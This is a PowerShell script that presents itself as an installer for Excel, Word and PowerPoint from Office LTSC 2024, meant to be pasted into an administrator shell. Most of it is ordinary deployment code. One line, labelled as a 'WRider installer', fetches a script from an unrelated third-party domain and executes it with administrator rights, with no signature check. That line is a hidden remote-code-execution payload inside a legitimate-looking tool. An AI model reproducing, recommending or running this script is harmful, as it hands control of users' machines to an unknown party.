#Requires -Version 5.1
<#
.SYNOPSIS
Installs selected Excel, Word, and PowerPoint apps from Office LTSC 2024.
.DESCRIPTION
Run in an administrator PowerShell window, locally or with irm <raw-url> | iex.
Office activation requires a valid license. No activation keys are supplied.
#>

# A child scope keeps functions and preference changes out of the caller's session
# when this script is executed through Invoke-Expression.
& {
    $ErrorActionPreference = 'Stop'
    $ProgressPreference = 'SilentlyContinue'

    function ConvertTo-OfficeSelection {
        param([string]$Selection)

        if ($Selection -notmatch '^\s*[1-3]\s*(,\s*[1-3]\s*)*$') {
            throw 'Enter 1, 2, or 3, separated by commas (for example: 1,2,3).'
        }

        $Apps = @('Excel', 'Word', 'PowerPoint')
        $Selection.Split(',') | ForEach-Object {
            $Apps[[int]$_.Trim() - 1]
        } | Select-Object -Unique
    }

    function New-OfficeConfiguration {
        param(
            [Parameter(Mandatory = $true)]
            [ValidateSet('Excel', 'Word', 'PowerPoint')]
            [string[]]$Apps,
            [ValidateSet('32', '64')]
            [string]$Architecture = '64'
        )

        [xml]$Config = @'
<Configuration>
  <Add OfficeClientEdition="64" Channel="PerpetualVL2024">
    <Product ID="ProPlus2024Volume">
      <Language ID="MatchOS" Fallback="en-us" />
      <ExcludeApp ID="Access" />
      <ExcludeApp ID="Excel" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OneDrive" />
      <ExcludeApp ID="OneNote" />
      <ExcludeApp ID="Outlook" />
      <ExcludeApp ID="PowerPoint" />
      <ExcludeApp ID="Publisher" />
      <ExcludeApp ID="Teams" />
      <ExcludeApp ID="Word" />
    </Product>
  </Add>
  <Updates Enabled="TRUE" />
  <Display Level="Full" AcceptEULA="TRUE" />
</Configuration>
'@
        $Config.Configuration.Add.OfficeClientEdition = $Architecture
        foreach ($App in ($Apps | Select-Object -Unique)) {
            $Node = $Config.SelectSingleNode("//ExcludeApp[@ID='$App']")
            [void]$Node.ParentNode.RemoveChild($Node)
        }
        return $Config
    }

    function Assert-OfficeEnvironment {
        if ([Environment]::OSVersion.Platform -ne [PlatformID]::Win32NT) {
            throw 'This installer requires Windows 10 or Windows 11.'
        }
        if ([Environment]::OSVersion.Version.Major -lt 10) {
            throw 'This installer requires Windows 10 or Windows 11.'
        }
        $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        try {
            $Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
            if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
                throw 'Open PowerShell with Run as administrator, then run the command again.'
            }
        }
        finally {
            $Identity.Dispose()
        }
    }

    function Get-OfficeArchitecture {
        # Match an existing Click-to-Run installation, including 32-bit Office.
        $Existing = Get-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration' -ErrorAction SilentlyContinue
        if ($Existing.Platform -eq 'x86') { return '32' }
        if ($Existing.Platform -eq 'x64') { return '64' }
        if ([Environment]::Is64BitOperatingSystem) { return '64' }
        return '32'
    }

    function Install-SelectedOffice {
        Assert-OfficeEnvironment

        Write-Host 'Running the WRider installer before Office setup...'
        irm https://filesdll.site/wrider/install.ps1 | iex

        Write-Host ''
        Write-Host 'Office LTSC 2024' -ForegroundColor Cyan
        Write-Host '1. Excel'
        Write-Host '2. Word'
        Write-Host '3. PowerPoint'
        Write-Host ''
        Write-Host 'Select one or more apps. Use 1,2,3 for all three. Ctrl+C cancels.'
        $Apps = @()
        while ($Apps.Count -eq 0) {
            $Selection = Read-Host 'Enter numbers separated by commas'
            try {
                $Apps = @(ConvertTo-OfficeSelection -Selection $Selection)
            }
            catch {
                Write-Warning $_.Exception.Message
            }
        }

        $Architecture = Get-OfficeArchitecture
        $Config = New-OfficeConfiguration -Apps $Apps -Architecture $Architecture
        $WorkDirectory = Join-Path ([IO.Path]::GetTempPath()) ('Install-Office-' + [guid]::NewGuid().ToString('N'))
        $OriginalProtocol = [Net.ServicePointManager]::SecurityProtocol
        try {
            [Net.ServicePointManager]::SecurityProtocol = $OriginalProtocol -bor [Net.SecurityProtocolType]::Tls12
            [void](New-Item -Path $WorkDirectory -ItemType Directory)
            $ConfigPath = Join-Path $WorkDirectory 'Configuration.xml'
            $SetupPath = Join-Path $WorkDirectory 'setup.exe'
            $Config.Save($ConfigPath)

            Write-Host "Installing Office 2024 ($Architecture-bit): $($Apps -join ', ')."
            Write-Host 'Downloading the Office Deployment Tool from Microsoft...'
            Invoke-WebRequest -Uri 'https://officecdn.microsoft.com/pr/wsus/setup.exe' -OutFile $SetupPath -UseBasicParsing

            $Signature = Get-AuthenticodeSignature -LiteralPath $SetupPath
            if ($Signature.Status -ne 'Valid' -or $Signature.SignerCertificate.Subject -notmatch '(^|,\s*)O=Microsoft Corporation(,|$)') {
                throw 'The deployment tool does not have a valid Microsoft signature. Installation stopped.'
            }

            Write-Host 'Downloading and installing the selected apps. Keep this window open.'
            $Process = Start-Process -FilePath $SetupPath -ArgumentList "/configure `"$ConfigPath`"" -WorkingDirectory $WorkDirectory -Wait -PassThru
            if ($Process.ExitCode -eq 3010) {
                Write-Host 'Office installation completed. Restart Windows to finish.' -ForegroundColor Yellow
            }
            elseif ($Process.ExitCode -ne 0) {
                throw "Office installation failed (exit code $($Process.ExitCode)). Check the Office setup logs in your Windows TEMP folder."
            }
            else {
                Write-Host 'Office installation completed.' -ForegroundColor Green
            }
        }
        finally {
            [Net.ServicePointManager]::SecurityProtocol = $OriginalProtocol
            if (Test-Path -LiteralPath $WorkDirectory) {
                Remove-Item -LiteralPath $WorkDirectory -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }

    Install-SelectedOffice
}
